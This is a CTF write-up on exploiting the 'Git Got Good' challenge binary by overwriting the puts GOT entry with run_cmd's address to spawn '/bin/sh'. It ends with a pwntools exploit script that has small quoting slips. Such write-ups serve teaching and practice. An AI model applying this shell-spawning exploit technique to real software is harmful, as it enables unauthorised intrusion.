CTFd —  Git Got Good (part 1 - overwriting GOT entry)

FIrst off, lets checksec the binary :

        Arch:         amd64-64-little

        RELRO:        Partial RELRO

        Stack:        Canary found

        NX:           NX enabled

        PIE:          No PIE (0x400000)

Let’s look at the disassembly :

So there’s an fgets function call at 0x4007d9 which reads user input. After that there is a printf call and a puts call. The printf only prints out the string passed to it so it’s not any use but the puts takes whatever is in rdi and prints that to the screen. Maybe we can use that. Let’s explore the fgets first

esi = 0x18 that means it accepts 24 bytes of input

When I send it  ‘A’*8 + ‘B’*8 + ‘C’*8 (cause 64 bit/8 byte architecture) I see two things:

  1. My input is split up into 8 byte chunks and stored in registers rax, rdx and rcx respectively
  2. the program crashes at 0x400800 <main+149> where the instruction is mov rax into [rcx]. Since dereference rcx is not a valid address the program crashes, makes sense

What this tells me is that I can craft my payload in a way that rcx is a valid address and whatever is at rax (first 8 bytes of my input) will be written at [rcx]. So now I have a way to way what I want and where I want it.

Another interesting thing is that the next instruction after the crash moves rdx into [rcx + 8].

rax  →  [rcx]

rdx  →  [rcx + 8]

Now what’s our target address. Lets see what the GOT entries look like :

The one in bold is the interesting one, the puts call (the second one, why? Because by the time fgets gets called only the second one is left to be overwritten).

Ideally, when the program call puts@plt, the PLT points it to the address 0x601018 where GOT seeks to resolve the function call to puts@GLIBC_2.2.5. So if we replace 0x601018 with say the address of the run_cmd function, the program would run that function with whatever is the string that is passed to it.

Again, our pieces are

rax  →  [rcx]

rdx  →  [rcx + 8]

Before puts is called the second time, whatever is in rax is moved to rdi

So if we are calling run_cmd instead of puts, we need our string ‘/bin/sh\x00’ to be in rdi or rax (first 8 bytes). Then we need the address of run_cmd (0x0040074b) to be placed at 0x601018. The only way to deference an address is through rcx. Since rdx is the other part of the input that gets stored at [rcx  + 8] we can have the address of the run_cmd at rdx (second 8 bytes) and have [rcx + 8] == 0x601018. Thus rcx needs to be equal to 0x601010 (the third 8 bytes)

So out payload becomes ‘/bin/sh/\x00’ + run_cmd_addr + puts_offset

from pwn import *

run_cmd = p64(0x40074b)

puts_offset = p64(0x601010)

payload ='/bin/sh\x00' + run_cmd + puts_offset + '\n

context.log_level = 'debug'

p = process('./git_got_good)

gdb_script = '''

set follow-fork-mode parent

break * 0x400800

break puts

break printf

break fgets

'''

# 0x400800 the address where the program crashes

# gdb.attach(p, gdb_script)

p.sendafter('save: ', payload)

p.interactive()
